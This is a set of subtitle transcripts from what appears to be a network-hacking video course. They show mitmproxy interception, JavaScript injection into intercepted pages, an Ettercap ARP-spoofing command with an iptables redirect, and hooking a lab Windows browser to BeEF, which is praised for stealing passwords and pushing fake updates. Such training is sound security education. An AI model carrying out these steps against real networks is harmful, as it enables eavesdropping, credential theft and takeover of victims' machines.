00:02:48,550 --> 00:02:50,800
You can resume this packet.

40
00:02:50,800 --> 00:02:53,380
So if I just click on the resume here, Now watch this.

41
00:02:53,380 --> 00:02:57,250
Now it's already it's paused now if I click on the resume.

42
00:02:58,100 --> 00:02:59,600
And click it again.

43
00:02:59,690 --> 00:03:04,700
As you can see, it got sent and it's telling you that it took two minutes to send because obviously

44
00:03:04,700 --> 00:03:08,990
we posed that packet, we intercepted it or we intercepted that request.

45
00:03:10,190 --> 00:03:18,260
If we go here again, you could download, delete, duplicate, repeat or even abort this connection.

46
00:03:19,380 --> 00:03:25,800
Now to go back, I'm just going to click on Start and basically now you can use any rule that you want

47
00:03:25,830 --> 00:03:26,460
in here.

48
00:03:26,460 --> 00:03:32,670
And based on that rule, man in the middle proxy will intercept packets and prevent them from going.

49
00:03:33,300 --> 00:03:35,070
Let me give you another example.

50
00:03:35,070 --> 00:03:38,250
So I'm just going to do forward slash star.

51
00:03:39,480 --> 00:03:42,360
And usually the star is used as a wild card.

52
00:03:42,510 --> 00:03:49,110
So right now, if I go to Bing and try to go anywhere, so let's just click any of these links right

53
00:03:49,110 --> 00:03:49,620
here.

54
00:03:51,500 --> 00:03:54,110
You'll see that everything is going to be posed.

55
00:03:54,990 --> 00:03:57,930
So let's, for example, try to go to a different website.

56
00:03:57,930 --> 00:04:01,350
Let's try to go to Google.com.

57
00:04:04,170 --> 00:04:04,710
Same.

58
00:04:04,710 --> 00:04:05,600
Nothing happens.

59
00:04:05,610 --> 00:04:09,450
Let's try to go to Facebook.

60
00:04:13,180 --> 00:04:13,780
Same.

61
00:04:13,780 --> 00:04:17,350
As you can see, everything is getting posed in here.

62
00:04:17,350 --> 00:04:19,210
Everything is getting intercepted.

63
00:04:19,210 --> 00:04:22,990
And now we're actually cutting the Internet connection from our target.

64
00:04:22,990 --> 00:04:24,790
So they've lost all of their connection.

65
00:04:24,790 --> 00:04:31,060
They can't do anything because we told man in the middle proxy to intercept any URL that has a forward

66
00:04:31,060 --> 00:04:33,940
slash followed by a star, which is a wild card.

67
00:04:35,660 --> 00:04:36,080
All right.

68
00:04:36,110 --> 00:04:42,080
Now, in this lecture, I just wanted to give you a quick view and a quick idea of how to use the Intercept

69
00:04:42,080 --> 00:04:42,770
feature.

70
00:04:42,770 --> 00:04:49,670
And in the next lecture, I'll show you a useful example of using the intercept and modifying the intercept

71
00:04:49,670 --> 00:04:50,390
packets.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,920 --> 00:00:01,400
All right.

2
00:00:01,430 --> 00:00:08,330
Now that we know the basic usage of the Intercept feature, let me show you how to use it and modify

3
00:00:08,330 --> 00:00:12,890
packets on the fly and we'll see how that will look in the target browser.

4
00:00:13,400 --> 00:00:17,570
So first of all, I have no intercept rules added, as you can see here.

5
00:00:17,570 --> 00:00:22,520
And I'm just going to go to my target browser and I'll just go to Bing.com.

6
00:00:24,800 --> 00:00:27,170
So you can see the packets that are flowing here.

7
00:00:27,170 --> 00:00:33,380
And the reason why I did this first is because I want to understand I want to show you how to filter

8
00:00:33,380 --> 00:00:37,430
packets, understand what you want to do, and then run your attack.

9
00:00:37,640 --> 00:00:44,120
So what we want to see right now is whenever whenever a user goes to Bing.com, we want to see what

10
00:00:44,120 --> 00:00:47,780
do they get, what responses they get from the server.

11
00:00:48,500 --> 00:00:54,830
So I'm going to click on the search and we're going to use Tilda s as shown before, because we said

12
00:00:54,830 --> 00:00:57,680
that filters the responses only for us.

13
00:00:57,680 --> 00:01:00,920
And as you can see, we have all the responses here already.

14
00:01:01,310 --> 00:01:07,700
So we can see that the first request that was made was a request to W-w-w dot Bing.com.

15
00:01:08,210 --> 00:01:11,350
And then in here we can see the request info.

16
00:01:11,360 --> 00:01:17,570
If I click on the response, you'll see that the target user got the HTML page.

17
00:01:17,570 --> 00:01:22,130
So they got the markup code that's rendering that page in here.

18
00:01:22,250 --> 00:01:27,300
So basically if I right click this and view page source.

19
00:01:28,920 --> 00:01:33,990
You'll see that this code is actually what's being sent in here in these packets.

20
00:01:34,020 --> 00:01:39,060
It's also being sent with all the images, the JavaScript and the CSS files.

21
00:01:39,670 --> 00:01:44,620
So basically all of that is being sent to the target as a response.

22
00:01:44,860 --> 00:01:49,660
And since we are the man in the middle, since the browser is configured to use man in the middle proxy

23
00:01:49,660 --> 00:01:56,290
as a proxy, everything is flowing through this and we can actually modify any piece that we want.

24
00:01:56,320 --> 00:02:03,070
We can modify the images, the JavaScript, the HTML code in here or anything that we want, really.

25
00:02:03,620 --> 00:02:05,960
So this is what I want to show you in this lecture.

26
00:02:05,960 --> 00:02:12,170
I actually want to show you how to inject JavaScript code into this web page that's been loaded by the

27
00:02:12,170 --> 00:02:15,080
target person through man in the middle proxy.

28
00:02:15,900 --> 00:02:18,660
Now, if we look at this source code carefully.

29
00:02:18,660 --> 00:02:19,980
So I'm just going to zoom in.

30
00:02:21,840 --> 00:02:26,720
You can see now this is always used in every HTML page.

31
00:02:26,730 --> 00:02:30,530
You'll see that the page usually ends with a slash body.

32
00:02:30,540 --> 00:02:37,980
So this tag basically ends the part of the code that is displayed to the user that's responsible for

33
00:02:37,980 --> 00:02:43,740
rendering all the tags and all the HTML features that you see on the page.

34
00:02:44,370 --> 00:02:50,970
Now, inside the HTML page, you can put Javascripts anywhere you want so you can see that they actually

35
00:02:50,970 --> 00:02:57,210
have javascripts after the body, you can put them anywhere you want really, but a very, very good

36
00:02:57,210 --> 00:03:01,050
place to place them is right before the body tag.

37
00:03:01,860 --> 00:03:06,210
Now we want to inject JavaScript, so this is what we're going to do.

38
00:03:06,240 --> 00:03:08,130
I'm going to go back here to the start.

39
00:03:09,010 --> 00:03:11,110
And I'm going to add an intercept rule.

40
00:03:11,320 --> 00:03:12,880
Let me zoom in first.

41
00:03:14,660 --> 00:03:20,960
And in this intercept rule, I want to intercept based on the response body.

42
00:03:20,990 --> 00:03:27,110
Because as you can see, this is the code is being sent and the response body in here.

43
00:03:27,320 --> 00:03:34,490
So I'm going to add tilde BS because as you can see here, the rule responsible for the response body

44
00:03:34,490 --> 00:03:37,160
is tilde BS.

45
00:03:38,740 --> 00:03:46,580
And then I'm going to specify what piece of code that I want to be used to trigger the intercept.

46
00:03:46,600 --> 00:03:52,410
So what piece of code in here that I want to use to trigger my intercept rule?

47
00:03:52,420 --> 00:03:58,540
And like I said, we're looking for the slash body because we want to inject our JavaScript before it.

48
00:03:58,690 --> 00:04:01,120
So I'm going to look for slash body.

49
00:04:03,890 --> 00:04:09,170
And you can see that there is a note saying it's not implemented properly, but it actually works.

50
00:04:09,170 --> 00:04:12,140
So we're actually going to use it and you'll see that it works.

51
00:04:12,320 --> 00:04:13,160
And that's it.

52
00:04:13,190 --> 00:04:13,940
We're done now.

53
00:04:13,940 --> 00:04:24,110
Now, every time this browser opens a page that contains in its code a tag that looks like this is going

54
00:04:24,110 --> 00:04:30,170
to be intercepted, that flow is going to be intercepted, and then we'll be able to modify that flow

55
00:04:30,170 --> 00:04:32,150
and do whatever we want with it.

56
00:04:32,510 --> 00:04:37,310
So let's go back to Bing and let's just give it a refresh.

57
00:04:39,820 --> 00:04:43,570
Now you'll see that it's still loading because something got intercepted here.

58
00:04:43,570 --> 00:04:47,800
And as you can see, we have a packet or a flow that got intercepted.

59
00:04:48,010 --> 00:04:51,340
If I click on it, you'll see its content.

60
00:04:51,340 --> 00:04:57,040
And what I want to do this time is I want to modify the code so you can see that the code is being sent

61
00:04:57,040 --> 00:04:57,670
in here.

62
00:04:57,670 --> 00:05:01,810
And I actually want to modify this and add my JavaScript.

63
00:05:02,530 --> 00:05:06,100
To modify this, you just have to click on the pencil here.

64
00:05:07,360 --> 00:05:13,930
And as you can see, it changes to a text box where you can modify and I'm going to use my arrow to

65
00:05:13,930 --> 00:05:16,270
move all the way down till the end.

66
00:05:16,690 --> 00:05:20,680
And as you can see, we have our slash body tag in here.

67
00:05:21,700 --> 00:05:26,830
So what we want to do is we want to inject our JavaScript before that.

68
00:05:27,160 --> 00:05:31,500
So I'm actually just going to write it in here in a text editor.

69
00:05:31,510 --> 00:05:33,580
So I'm just going to open my leafpad.

70
00:05:35,310 --> 00:05:38,040
And the code is going to be script.

71
00:05:39,760 --> 00:05:43,420
Alert test slash script.

72
00:05:44,400 --> 00:05:50,610
So we're using a very, very simple JavaScript code, and all this code is going to do, it's going

73
00:05:50,610 --> 00:05:54,720
to use a function called alert, which basically shows a message box.

74
00:05:54,720 --> 00:05:57,210
And that message box is going to say test.

75
00:05:57,690 --> 00:06:03,420
And we're put in this between two script tags because that's the way you have to put it inside HTML

76
00:06:03,450 --> 00:06:04,260
pages.

77
00:06:04,620 --> 00:06:09,630
Now, this is a very simple script that doesn't really allow us to do much, but we're still testing,

78
00:06:09,630 --> 00:06:12,480
we're still just learning and seeing what we can do.

79
00:06:12,480 --> 00:06:17,430
And then later on we'll see how we can adapt this to do more powerful attacks.

80
00:06:17,430 --> 00:06:23,340
Because if we can run JavaScript, a simple JavaScript code, that means we can use the same idea to

81
00:06:23,340 --> 00:06:29,850
run more complex JavaScript codes like a screenshot or a keylogger and so on.

82
00:06:30,300 --> 00:06:37,740
So I'm going to copy this, go back and I'm literally just going to paste it in here right before the

83
00:06:37,740 --> 00:06:38,640
slash body.

84
00:06:40,690 --> 00:06:43,230
Now that's pasted in here, as you can see.

85
00:06:43,240 --> 00:06:47,170
And we're ready to forward this packet to the user.

86
00:06:47,410 --> 00:06:50,590
Now, before we can do that, we have to save this.

87
00:06:50,620 --> 00:06:52,840
We have to save what we changed in here.

88
00:06:52,840 --> 00:06:59,590
And for some reason with the browser, the web UI here, it hides the save button.

89
00:06:59,800 --> 00:07:05,560
So in order to get back to it, I'm going to click in here over the date and then I'm going to press

90
00:07:05,560 --> 00:07:11,470
on the tab key on my keyboard that will switch to the next tab, which is the details.

91
00:07:11,710 --> 00:07:13,630
I'll go back to responses.

92
00:07:14,050 --> 00:07:17,540
And then as you can see, now, it's still not saved.

93
00:07:17,560 --> 00:07:20,410
I'll have to click on the check in here to save it.

94
00:07:20,990 --> 00:07:22,490
So I'm going to click on it.

95
00:07:22,490 --> 00:07:24,890
And that's the response saved.

96
00:07:25,810 --> 00:07:30,220
Now all we have to do is just resume the flow of data.

97
00:07:30,220 --> 00:07:32,800
So I'm going to click on the post packet in here.

98
00:07:32,800 --> 00:07:36,340
I'm going to go on flow and I'm going to click on resume.

99
00:07:36,340 --> 00:07:42,370
And as I as soon as I do that, you'll see an alert box will show up in here because that's the code

100
00:07:42,370 --> 00:07:43,510
that we injected.

101
00:07:43,870 --> 00:07:45,400
So I'm going to do resume.

102
00:07:46,630 --> 00:07:50,200
And as you can see, we got an alert box saying test.

103
00:07:51,250 --> 00:07:58,690
Now, this is huge because like I said, we managed to inject JavaScript code into the target browser.

104
00:07:59,170 --> 00:08:04,030
Now I know this code is very simple and I know we're only doing this against our own browser.

105
00:08:04,030 --> 00:08:09,040
We're not doing it against a separate computer, but we'll do all of that later on.

106
00:08:09,040 --> 00:08:16,480
Right now I want to show you the right way to analyze packets and then start building your attack from

107
00:08:16,480 --> 00:08:16,690
there.

108
00:08:16,690 --> 00:08:21,670
So first of all, we analyze the packets we see in the part of the code where we want to inject our

109
00:08:21,670 --> 00:08:22,210
code.

110
00:08:22,210 --> 00:08:26,470
We seen we tested it with a simple code on our computer.

111
00:08:26,470 --> 00:08:33,490
We make sure that works and then we can run more complex code and we can run it with an ARP spoofing

112
00:08:33,490 --> 00:08:40,060
attack or any man in the middle attack so that we can run these attacks against separate computers that

113
00:08:40,060 --> 00:08:43,960
are connected to the same network or connected to a fake access point.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,650 --> 00:00:01,160
All right.

2
00:00:01,190 --> 00:00:07,240
Now, so far we've seen how to use Man in the middle proxy to do some really cool stuff.

3
00:00:07,250 --> 00:00:13,880
But everything we've done was done against our own browser, so we didn't actually target anyone.

4
00:00:13,880 --> 00:00:19,400
And we can't really tell our target to go ahead and configure their browser to use man in the middle

5
00:00:19,400 --> 00:00:21,080
proxy as a proxy.

6
00:00:21,110 --> 00:00:23,660
It's just not really going to happen in real life.

7
00:00:23,900 --> 00:00:30,050
So in this lecture, I want to show you how to run Man in the Middle proxy in a real life scenario and

8
00:00:30,050 --> 00:00:35,690
how we can do all the attacks that we've seen so far against another computer once we become the man

9
00:00:35,690 --> 00:00:36,470
in the middle.

10
00:00:36,920 --> 00:00:42,800
So the steps that I'm going to show you will work regardless of the method that you became the man in

11
00:00:42,800 --> 00:00:48,200
the middle, you can use it whether you run ARP spoofing or if you started your own fake access point

12
00:00:48,200 --> 00:00:52,070
or any other method that would allow you to become the man in the middle.

13
00:00:52,820 --> 00:00:58,340
In my example, I'm going to become the man in the middle using an ARP spoofing attack.

14
00:00:58,760 --> 00:01:01,590
So we've seen how to do that multiple times.

15
00:01:01,590 --> 00:01:03,060
I'm going to use Ettercap.

16
00:01:03,090 --> 00:01:06,450
You can use Arpspoof or man in the middle if you have the choice.

17
00:01:06,450 --> 00:01:07,890
I'm just going to use Ettercap.

18
00:01:07,890 --> 00:01:11,150
So I'm going to be using the exact same command that I used before.

19
00:01:11,160 --> 00:01:12,690
I'm going to do Ettercap.

20
00:01:14,170 --> 00:01:25,630
T q m a r remote i eth0 and I'm going to use dash s so that we don't generate an SSL certificate.

21
00:01:25,750 --> 00:01:34,480
And then I'm going to put my targets, which is ten 2259 for the Windows machine and then ten 2251 for

22
00:01:34,480 --> 00:01:35,380
my router.

23
00:01:37,660 --> 00:01:40,570
I'm doing this very quickly because we cover this a lot.

24
00:01:40,570 --> 00:01:45,020
And if you don't understand how this works, please go back and revise its lecture.

25
00:01:45,070 --> 00:01:46,630
I'm going to hit Enter.

26
00:01:47,020 --> 00:01:49,840
And now I am the man in the middle.

27
00:01:50,790 --> 00:01:52,890
Now I'm going to split the screen.

28
00:01:53,610 --> 00:02:00,150
Now I'm the man in the middle and everything that the target machine does, which is this machine right

29
00:02:00,150 --> 00:02:06,060
here, the windows machine will be redirected to the Kali machine because the Windows machine thinks

30
00:02:06,060 --> 00:02:07,170
I am the router.

31
00:02:07,620 --> 00:02:16,950
Now what I need to do is I need to redirect anything, any data that comes on port 80 to the port that

32
00:02:16,950 --> 00:02:19,290
man in the middle proxy runs on.

33
00:02:19,680 --> 00:02:24,690
So this is very similar to what we did when we were using SSL strip.

34
00:02:25,290 --> 00:02:32,130
So we're going to use IP tables and we're going to use the exact same command that we used with SSL

35
00:02:32,130 --> 00:02:32,830
strip.

36
00:02:32,850 --> 00:02:35,040
So we're going to do IP tables.

37
00:02:35,840 --> 00:02:36,580
Tenat.

38
00:02:38,140 --> 00:02:39,900
To select the night table.

39
00:02:39,910 --> 00:02:43,780
And we're going to say that I want to append a pre routing argument.

40
00:02:44,550 --> 00:02:48,080
We specify the protocol, which is TCP.

41
00:02:48,600 --> 00:02:52,290
We specify the destination port, which is 80.

42
00:02:53,390 --> 00:03:01,850
And we want to redirect that to Port 8080, which is the port that man in the middle proxy runs on by

43
00:03:01,850 --> 00:03:02,510
default.

44
00:03:02,540 --> 00:03:04,670
When we were doing this with SSL strip.

45
00:03:04,700 --> 00:03:09,530
We use port 10,000 because SSL strip runs on port, 10,000.

46
00:03:09,560 --> 00:03:13,880
With this man in the middle, proxy runs on port 8080.

47
00:03:13,910 --> 00:03:16,120
So that's why we're using 880.

48
00:03:16,850 --> 00:03:23,090
So a very simple command that, again, we spoke about and we spoke about why we do it in the SSL strip

49
00:03:23,090 --> 00:03:23,840
lecture.

50
00:03:23,930 --> 00:03:30,020
So you can think of this command as the steps that we did when we were doing it on our own browser when

51
00:03:30,020 --> 00:03:38,990
we went to Settings and then we went on advanced and network settings and then we did we set it to use

52
00:03:38,990 --> 00:03:43,940
a manual proxy configuration and we configured it to use Man in the middle proxy.

53
00:03:44,660 --> 00:03:47,450
So this command is basically doing the same.

54
00:03:47,450 --> 00:03:55,290
We're telling our computer so that whenever it gets data on Port 80 to redirect it to port 8080, where

55
00:03:55,290 --> 00:03:58,260
man in the middle proxy is going to be running on.

56
00:03:58,770 --> 00:04:04,500
So I'm going to hit enter and that gets executed with no issues, which means the command got executed

57
00:04:04,500 --> 00:04:05,310
properly.

58
00:04:05,790 --> 00:04:11,520
The last thing that we need to do is run man in the middle proxy because now data is coming to my computer

59
00:04:11,520 --> 00:04:16,290
from the target computer because I'm the man in the middle, because I did an ARP spoofing attack.

60
00:04:16,440 --> 00:04:18,810
And this data is coming on Port 80.

61
00:04:18,840 --> 00:04:21,050
It's being redirected to port 8080.

62
00:04:21,060 --> 00:04:27,720
But I have nothing working on port 8080 to do to to analyze this data or to do anything with it.

63
00:04:27,960 --> 00:04:31,650
So the last step is going to be running man in the middle proxy.

64
00:04:31,680 --> 00:04:36,000
Now I'm already in its working directory which is opt man in the middle proxy.

65
00:04:36,660 --> 00:04:41,190
So all we have to do now is just do man in the middle web like we did before.

66
00:04:41,430 --> 00:04:46,050
And this time we're going to add one more argument and it's going to be dash.

67
00:04:46,050 --> 00:04:47,550
Dash, transparent.

68
00:04:48,210 --> 00:04:53,160
The reason why we're adding this argument because we're telemann in the middle proxy that I want you

69
00:04:53,160 --> 00:04:56,700
to run in the transparent mode by default.

70
00:04:56,700 --> 00:05:03,780
It used to run in the explicit mode where we had to configure our browser to use it as a proxy.

71
00:05:03,870 --> 00:05:08,520
This time no browsers are being configured to use it as a proxy.

72
00:05:08,520 --> 00:05:14,940
And we're doing this with an ARP spoofing attack and we're using IP tables to redirect the data to man

73
00:05:14,940 --> 00:05:15,930
in the middle proxy.

74
00:05:15,930 --> 00:05:19,890
So we have to tell it that I want you to run in transparent mode.

75
00:05:20,490 --> 00:05:21,870
I'm going to hit Enter.

76
00:05:23,160 --> 00:05:25,170
And that's it running for me.

77
00:05:25,770 --> 00:05:29,560
Now, I'm actually just going to refresh this because because that was opened before.

78
00:05:29,580 --> 00:05:32,670
So I'll just refresh this and you see that there is nothing here.

79
00:05:32,670 --> 00:05:37,050
And you can see here at the bottom, it's telling us that it's running in transparent mode.

80
00:05:37,620 --> 00:05:41,880
And now let's go to the Windows machine and just browse anything.

81
00:05:41,880 --> 00:05:45,940
Let's see if the data is actually going to go to man in the middle proxy.

82
00:05:45,960 --> 00:05:48,030
So let's just go to Bing.com.

83
00:05:49,950 --> 00:05:50,370
All right.

84
00:05:50,400 --> 00:05:53,520
Now let's go to Man in the middle proxy.

85
00:05:53,850 --> 00:05:57,590
And as you can see, we got everything in here.

86
00:05:57,600 --> 00:06:01,950
All the data is flowing in here through man in the middle proxy.

87
00:06:01,950 --> 00:06:08,880
And you can literally just analyze it, intercept it, edit it exactly the same way that I showed you

88
00:06:08,880 --> 00:06:09,660
before.

89
00:06:09,750 --> 00:06:16,680
So that's why it's really handy to know how to analyze and edit data on your local machine, because

90
00:06:16,680 --> 00:06:21,180
as you can see, when you're when you're running this against a different machine, there is a bit of

91
00:06:21,180 --> 00:06:22,860
configuration you have to do.

92
00:06:22,890 --> 00:06:29,100
You have to become the man in the middle and you have to add an IP table rule to redirect the data from

93
00:06:29,100 --> 00:06:31,740
port 80 to man in the middle proxy port.

94
00:06:31,770 --> 00:06:38,520
Therefore, it's always a good idea to analyze the data, test your attacks against your local machine

95
00:06:38,520 --> 00:06:45,360
first, and then once you're done, once your attacks are working, then execute it against the target

96
00:06:45,360 --> 00:06:47,610
using this method that I showed you here.

97
00:06:48,210 --> 00:06:52,360
Now, just like what we did when we were running this as an explicit proxy.

98
00:06:52,380 --> 00:06:59,040
Remember when we finished, I said, Remember to go and configure your your browser again to not to

99
00:06:59,040 --> 00:07:00,810
use man in the middle proxy.

100
00:07:00,840 --> 00:07:02,100
Same goes with this.

101
00:07:02,100 --> 00:07:04,740
Once you're done, you're going to quit this.

102
00:07:04,770 --> 00:07:07,560
You're going to do control C here to exit this.

103
00:07:07,560 --> 00:07:12,030
And finally, don't forget to remove the IP table rule that we added.

104
00:07:12,060 --> 00:07:14,400
To do that, we're going to do IP tables.

105
00:07:15,240 --> 00:07:20,610
Dash t, which is the table that we appended a rule to.

106
00:07:20,610 --> 00:07:23,190
And we're going to say, please flush this for me.

107
00:07:24,340 --> 00:07:25,310
And that's it.

108
00:07:25,330 --> 00:07:28,840
Our rule is cleared, and now we are back to normal.

109
00:07:28,870 --> 00:07:30,370
Back to where we started.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,330 --> 00:00:02,040
Okay.

2
00:00:02,050 --> 00:00:09,640
Now I became the man in the middle using an ARP spoofing attack using Ettercap here, which will redirect

3
00:00:09,640 --> 00:00:16,540
all the data to man in the middle proxy, which is running in transparent mode in here.

4
00:00:16,870 --> 00:00:25,150
This will allow me to intercept and read all the packets that or everything that the target person does

5
00:00:25,180 --> 00:00:26,410
on their computer.

6
00:00:26,830 --> 00:00:30,370
In here if I go to Bing.com.

7
00:00:32,150 --> 00:00:39,650
We can see all the data will flow in here in man in the Middle proxy where I can analyze and edit it.

8
00:00:40,340 --> 00:00:44,780
Now, in this lecture, I'd like to show you a more realistic example.

9
00:00:44,960 --> 00:00:53,600
So before we seen how to execute JavaScript code into our own browser and we executed a very simple

10
00:00:53,600 --> 00:00:55,550
code which was just an alert.

11
00:00:56,000 --> 00:01:03,410
In this example, I want to execute JavaScript code in the target browser in the Windows machine and

12
00:01:03,410 --> 00:01:06,080
I want to execute something more useful.

13
00:01:06,080 --> 00:01:09,650
So I want to get the target to be hooked to beef.

14
00:01:10,430 --> 00:01:15,230
Now the way of getting the code to be executed is going to be very similar.

15
00:01:15,260 --> 00:01:21,500
The reason why I'm doing it again, just to show you that if an attack works against the browser and

16
00:01:21,500 --> 00:01:27,920
the explicit proxy mode, that means it will still work against remote browsers when you become the

17
00:01:27,920 --> 00:01:28,940
man in the middle.

18
00:01:29,210 --> 00:01:35,340
Also, I want to show you that if you manage to execute any simple code like the alert code, then you'll

19
00:01:35,340 --> 00:01:38,280
be able to execute more complex code.

20
00:01:38,820 --> 00:01:42,330
So first of all, I'm going to run beef.

21
00:01:43,140 --> 00:01:47,160
So I'm just going to go here and click on beef.

22
00:01:47,610 --> 00:01:51,060
Now beef is a browser exploitation framework.

23
00:01:51,330 --> 00:01:58,380
It allows you to run a number of attacks against hooked browsers, and it uses JavaScript to run all

24
00:01:58,380 --> 00:02:01,710
of these attacks and to hook the targets to you.

25
00:02:02,490 --> 00:02:05,820
I covered beef before in my network hacking course.

26
00:02:05,820 --> 00:02:12,900
I covered it in more details in my ethical hacking course, and then I covered it in great detail in

27
00:02:12,900 --> 00:02:17,850
my social engineering course because there are so many social engineering attacks that you can do using

28
00:02:17,850 --> 00:02:18,420
beef.

29
00:02:19,050 --> 00:02:24,120
So in this lecture, I'm going to show you how to hook someone to beef, but I'm not going to be covering

30
00:02:24,120 --> 00:02:29,190
how to use beef because using beef is not really a network hacking skill.

31
00:02:29,190 --> 00:02:31,470
And this is a network hacking course.

32
00:02:31,470 --> 00:02:33,890
But beef is a really, really cool tool.

33
00:02:33,900 --> 00:02:41,850
It allows you to display messages, get screenshots, steal passwords, prompt the user to download

34
00:02:41,850 --> 00:02:48,690
a fake update, and then hack their computer and more methods to literally hack the target computer

35
00:02:48,690 --> 00:02:50,670
and get full control over it.

36
00:02:50,760 --> 00:02:57,090
If you like it, then check out my social engineering course as I cover beef in great details and I

37
00:02:57,090 --> 00:02:59,220
spend a quite a lot of lectures on it.

38
00:02:59,860 --> 00:03:01,900
Now beef is running.

39
00:03:01,900 --> 00:03:08,020
And in order to get someone to be hooked to beef, as you can see now, I have nothing in my online

40
00:03:08,020 --> 00:03:08,890
browsers.

41
00:03:09,520 --> 00:03:13,660
So to get someone hooked to beef, you have to use its code.

42
00:03:13,660 --> 00:03:20,470
So if I click here on the command prompt that started beef for me, you see that it actually gives me

43
00:03:20,470 --> 00:03:26,410
the code that I need to execute on the target browser so that they get hooked to beef.

44
00:03:26,770 --> 00:03:28,630
So I'm going to copy this code.

45
00:03:31,120 --> 00:03:32,710
And paste it here.

46
00:03:34,300 --> 00:03:41,020
Now you can see that this is a JavaScript code similar to what we executed before in the alert, and

47
00:03:41,020 --> 00:03:41,950
that's the whole idea.

48
00:03:41,950 --> 00:03:47,590
I said if you manage to execute something simple, then you'll be able to execute something more complex.

49
00:03:48,100 --> 00:03:56,260
Now this code is actually loading the JavaScript from this URL, so you have to modify this to the IP

50
00:03:56,410 --> 00:03:57,880
of your computer.

51
00:03:58,480 --> 00:04:02,380
To get the IP of my computer, I have to do ifconfig.

52
00:04:06,930 --> 00:04:12,810
And if we scroll up, you'll see my IP is ten, 22, 15 eight.

53
00:04:13,530 --> 00:04:21,240
So I'm going to go down and just change this to ten 2258.

54
00:04:22,620 --> 00:04:23,550
And that's it.

55
00:04:23,550 --> 00:04:30,360
The code is ready to be used, and from now on, the steps are going to be identical to running the

56
00:04:30,360 --> 00:04:31,320
alert script.

57
00:04:31,320 --> 00:04:33,840
So first of all, I'm going to copy all of this.

58
00:04:36,910 --> 00:04:37,960
I'm going to go on.

59
00:04:37,990 --> 00:04:39,670
Man in the middle proxy.

60
00:04:41,380 --> 00:04:43,210
I'm going to intercept.

61
00:04:43,480 --> 00:04:46,710
I'm going to look for body in the response body.

62
00:04:46,720 --> 00:04:52,090
So we're going to do BS and we're looking for slash body.

63
00:04:53,530 --> 00:04:56,800
Now, you see, I have the intercept label in here.

64
00:04:56,800 --> 00:05:03,820
And that means now whenever a response goes to the target computer that contains this body tag right

65
00:05:03,820 --> 00:05:07,960
here, it will be intercepted and then I'll be able to edit it.

66
00:05:08,320 --> 00:05:08,980
Perfect.

67
00:05:09,010 --> 00:05:14,630
Now let's go to the target computer and just refresh the page.

68
00:05:16,110 --> 00:05:19,740
As you can see, this will get stuck if we go back.

69
00:05:20,530 --> 00:05:26,120
Scroll down, you'll see we have the flow here that got intercepted.

70
00:05:26,140 --> 00:05:29,620
It's written in orange, which means it got intercepted.

71
00:05:29,800 --> 00:05:31,840
We can go to the response.

72
00:05:32,440 --> 00:05:35,920
We go on the edit just like we did before.

73
00:05:36,460 --> 00:05:41,110
Click here, scroll all the way down using the down arrow.

74
00:05:41,470 --> 00:05:45,520
Look for the body tag, which is right here.

75
00:05:46,720 --> 00:05:49,870
And we want to place our code before that.

76
00:05:49,870 --> 00:05:51,570
So I've already copied this.

77
00:05:51,580 --> 00:05:53,950
I'm going to press Ctrl V to paste it.

78
00:05:54,960 --> 00:05:56,070
And that's it.

79
00:05:56,100 --> 00:05:59,340
My code is inserted in here, as you can see.

80
00:06:00,160 --> 00:06:00,880
Perfect.

81
00:06:00,910 --> 00:06:03,100
Now all we have to do is just save this.

82
00:06:03,130 --> 00:06:08,470
Like I said before, when you edit stuff, the screen will go down and you won't go up.

83
00:06:08,470 --> 00:06:10,110
So this is actually a bug.

84
00:06:10,120 --> 00:06:16,510
So all you have to do is just click in here, click on the tab button on your keyboard.

85
00:06:16,780 --> 00:06:18,910
This will move you to the next tab.

86
00:06:18,940 --> 00:06:26,320
Click on responses to go back and then click on the check in here that will finish the editing for me.

87
00:06:26,320 --> 00:06:27,880
And now I'm good to go.

88
00:06:27,880 --> 00:06:34,330
Now I can just click on the resume to resume this data flow and that's it.

89
00:06:34,360 --> 00:06:38,470
Now if we go to the target browser, you'll see the page loaded.

90
00:06:38,470 --> 00:06:40,030
It's not loading anymore.

91
00:06:40,120 --> 00:06:44,500
And if we go to beef, we'll see.

92
00:06:44,500 --> 00:06:48,730
We have an online browser in here and that's it.

93
00:06:48,760 --> 00:06:55,480
Now if we go on the commands, you can see we can run any beef command that we want.

94
00:06:55,870 --> 00:07:02,810
So like I said, now you can display fake messages, fake updates or on social engineering attacks and

95
00:07:02,810 --> 00:07:06,530
do all of the cool stuff that I explained into my other lectures.

96
00:07:07,010 --> 00:07:11,210
I might add a bonus lecture or two just to show you how powerful beef is.

97
00:07:11,240 --> 00:07:14,330
But I think a lot of you are familiar with it by now.

98
00:07:14,900 --> 00:07:20,660
Let's run a simple alert prompt just to make sure that beef can execute commands on the target browser.

99
00:07:20,660 --> 00:07:26,390
So I'm just going to type alert here to search and I have my alert module.

100
00:07:26,390 --> 00:07:30,200
And this will this will just display beef alert dialogue.

101
00:07:30,800 --> 00:07:35,390
I'm going to execute this, go on the target.

102
00:07:35,390 --> 00:07:39,380
And as you can see, the JavaScript code got executed.

103
00:07:39,710 --> 00:07:40,760
Great stuff.

104
00:07:40,760 --> 00:07:48,080
Now, as you can see, the best way to build an attack is first, analyze what happens when the target

105
00:07:48,080 --> 00:07:48,860
does something.

106
00:07:48,860 --> 00:07:55,580
For example, when they load a page, then build a very simple attack against a basic setup.

107
00:07:55,580 --> 00:08:02,000
So like you've seen, we were testing the attack against our own browser and we were using the proxy

108
00:08:02,000 --> 00:08:06,320
as an explicit proxy use, a very simple code.

109
00:08:06,320 --> 00:08:12,110
So we use the very simple alert code to make sure that we can actually get this attack to work.

110
00:08:12,440 --> 00:08:18,980
Once we manage to get that simple code to work against our own computer in our simple setup, we can

111
00:08:18,980 --> 00:08:21,170
start making this attack more realistic.

112
00:08:21,170 --> 00:08:26,840
So then we change the proxy mode to transparent and combined it with ARP spoofing.

113
00:08:26,930 --> 00:08:32,330
When that worked, we executed a more complex code, the beef code.

114
00:08:32,330 --> 00:08:34,370
And now everything is working.

115
00:08:34,370 --> 00:08:38,330
And now our scenario is very, very realistic.

116
00:08:39,380 --> 00:08:41,840
There is one problem with this attack, though.

117
00:08:41,870 --> 00:08:49,010
Every time a packet comes here, we have to manually click on the edit, paste the code, and then resume

118
00:08:49,010 --> 00:08:49,820
the data.

119
00:08:49,970 --> 00:08:53,730
This will first slow the connection of the target person.

120
